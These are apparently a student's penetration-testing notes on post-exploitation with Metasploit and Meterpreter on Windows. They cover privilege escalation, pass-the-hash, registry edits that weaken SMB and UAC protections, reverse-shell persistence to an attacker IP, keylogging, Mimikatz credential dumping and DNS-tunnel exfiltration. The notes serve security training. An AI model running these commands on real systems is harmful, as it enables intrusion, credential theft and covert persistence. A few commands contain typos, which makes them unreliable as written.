Post-Exploitation is the last technique phase of a penetration test.

(Information gathering - Scanning and Enumeration - Exploitation - Post-Exploitation).

Post Exploitation is a cyclic process because new information gathered may lead to a chance of pivoting to other systems.

1) Privilege escalation and maintaining access
- 2) Data harvesting     <------------------------
 - 3) Internal network scan                      |
   - 4) Exploitation of new system and pivoting _|
   
 Metasploit is one of the most useful tool for exploitation and post-exploitation activities.
 Meterpreter is a "special" shell built into Metasploit which comes with a rich environment of ad-hoc commands for
    privilege escalation and for maintaining access on exploited machines.
    
Make meterpreter stable
------------------------
One of the first step once a meterpreter shell is running, it is to migrate to another process because the victim can
    kick the attacker of the system simply by closing the process to which the shell is bound.

While exploiting Windows one of the scripts to use is "run post/windows/manage/migrate".
This script automatically binds the running session to another windows process which is running with same privileges of
the first one (no vertical privilege escalation).

To do it manually:
- "ps" displays all running processes
- "migrate" binds the meterpreter session to the specified process id (pid)


Make meterpreter shell session persistent
------------------------------------------
In order to create a backdoor on the exploited system, highest privileges are quite always needed.
While attacking Windows machines, the "getsystem" command will automatically locate the most useful script/technique
to use for privilege escalation. (Tries all techinques one after the other until one succeeds)
To run a specific technique: "getsystem -t X" (X stands for value of technique)
"Getsystem" will not always succeed, for example UAC may come in the way and "block" it. (Use bypassuac in this case).

System local exploit are located at "exploit/[OS]/local" path.

Another way to gain SYSTEM privileges on Windows is by exploiting Unquoted Service Paths vulnerabilities.
In order to check for the presence of these vulnerabilities, an attacker can:
- use wmic: wmic service get name,displayname,pathname,startmode, | findstr /i "auto"  | findstr /i /v "C:\Windows\\" | findstr /i /v """
- use sc witch qc [service_name]
- use exploit/windows/local/trusted_service_path


The next step for an attacker, after having gained SYSTEM or root privileges, is to create a backdoor.
Meterpreter has some built-in feature pretty handy.
"run hashdump" allows to dump SAM hashes. From there an attacker may try to crack them or try to mount a "pass the hash" attack.

"run/exploit/windows/psexec" allows the use of psexec which permits to execute commands on remote hosts.
To run it requires SMBUSER, SMBPASS (HASH) and REMOTE HOST and a payload.
It may happen that the above exploit fails with a "Access denied" message.
This depends on whether the exploited user is an "actual" Administrator or simply a user in the Administrators group.
In order to change Windows registry and solve the issue:
- 1) Powershell: Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword
  2) Powershell: Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters
        -Name RequireSecuritySignature -Value 0 -Type Dword
- 1) reg: reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
  2) reg: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters"
        /v RequireSecuritySignaturey /t REG_DWORD /d 0 /f
        
Another way of performing a "pass the hash" attack on Windows is by attacking RDP services.
xfreerdp allows to pass the hash over RDP:
- xfreerdp /u:[USER]  /d:[DOMAIN] /pth:[HASH] /v:[IP_ADDRESS]

Mimikatz is another powerful tool to exploit Windows credentials' system.
It does come as a standalone tool but Metasploit does include it a Meterpreter extension.
In order to fully load Mimikatz features a 64-bit meterpreter session is needed.

"SYSINFO" command will help in finding the architecture of the process to which the meterpreter session
is bound. If it is not 64-bit, the attacket can use the "MIGRATE" built-in tool to migrate to a 64-bit
process.

Once the attacker has a 64-bit session available he can load Mimikatz by running "LOAD MIMIKATZ".
From there, Mimikatz can exploit Windows credentials.

Another useful tool to gather Windows credentials is WCE, which stands for Windows Credentials Editor.



RDP is a Windows feature an attacker may use as a backdoor.
The command "NET START" does show what services are enabled.
Other ways to check what servicesare enabled are through WMIC and Metasploit/Meterpreter scripts.
Meterpreter's "GETGUI" (run getgui) allows attackers to enable RDP service.
If the user of whom the attacker has stolen the credentials cannot connect via RDP, it is mandatory
to add it to the "REMOTE DESKTOP USERS" group.
Another thing to check is whether or not Windows Firewall does block RDP connections.


Creating a backdoor (better if acting as a reverse shell) is a very useful way of maintaining access
to exploited machines.
Metasploit through Meterpreter sessions has a built-in feature that makes persistence easy.
"RUN PERSISTENCE":
- A: starts the handler on attacker machine
- X: starts agent at boot (requires SYSTEM privileges)
- i 5: attempt connection every 5 seconds
- p X: port to connect back
- r [IP_ADDRESS]: attacker IP address

In order to manually set a payload to run at boot in the Windows Registry:
- reg setval -k "HKML\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -d [value_of_the_key:path_to_exe] -v [name_of_the_key]

Creating new users as Administrators or Root is another viable way of maintaining access.

DLL Hijacking/Preloading and Insecure Library Loading are techniques also useful for privilege escalation
and for maintaining access.
Windows does search DLLs in the following order:
- The directory from which the application si run from.
- The Windows' System32 folder.
- The 16-bit Windows system directory (C:\windows\system).
- The Windows directory (C:\Windows).
- The current directory at the time of execution.
- Any directories specified in the PATH environment variable.

ProcessMonitor by Sysinternals helps in finding DLLs called by programs and find vulnerabilities.


Harvest additional information
-------------------------------

This phase is called Pillaging or Data Harvesting.
Access to sensitive data or intellectual property may well be the very purpose of the Penetration test, so this phase is
very important.

The exploited machine may be the one holding the sensitive information needed ot it may not.
When it isn't, the attacker can found other useful information which will help in building a better picture about the target.

A list of useful commands:
- Meterpreter sysinfo: helps in gathering exploited system information
- Meterpreter getuid: returns the username of the user the attacker shell is currently running as.
- run post/windows/gather/... and post /linux/gather/... offer a great variety of scripts for pillaging.
- Metasploit scaper and winenum: scripts that include lists of command useful to gather information (then stored in files for later analysis).
- Meterpreter screenshot: captures screen of target machine and saves it locally on attacker machine.
- Metasploit/Meterpreter keyscan_start/dump/stop: let the attacker capture remote keystrokes.
- Metasploit/Meterpreter keylogrecorder: as above. Keyloggers need to the attached to the correct process in order to 
    record/log keystrokes. For example to log Windows' login credentials, a keylogger must be attached to winlogon.exe;
    in order to logkeystroke from application, it must be attached to explorer.exe.
- [W] All Windows net * commands + systeminfo.

DNS Tunneling allows for data exfiltration bypassing firewalls and other blocks (Iodine app, PacketWhisper).





